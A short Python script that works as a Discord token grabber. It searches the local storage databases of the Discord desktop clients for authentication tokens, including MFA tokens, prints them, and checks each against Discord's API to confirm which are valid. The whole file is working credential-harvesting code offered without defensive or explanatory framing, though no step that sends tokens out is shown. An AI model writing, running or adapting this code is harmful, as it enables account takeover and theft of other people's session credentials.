import os
from re import findall
from urllib.request import Request, urlopen
from json import loads

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
}

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_user_data(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=get_headers(token))).read().decode())
    except:
        return None

def find_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    if not os.path.exists(path):
        return []
        
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        try:
            with open(f"{path}\\{file_name}", errors="ignore") as f:
                for line in [x.strip() for x in f.readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
        except:
            pass
    return tokens

def main():
    checked = []
    working = []
    
    for _, path in PATHS.items():
        if not os.path.exists(path):
            continue
            
        for token in find_tokens(path):
            print(token)
            if token in checked:
                continue
            checked.append(token)
            
            user_data = get_user_data(token)
            if user_data:
                working.append(token)
                print(f"Valid token found: {token}")
                
    if not working:
        print("No valid tokens found")

if __name__ == "__main__":
    main()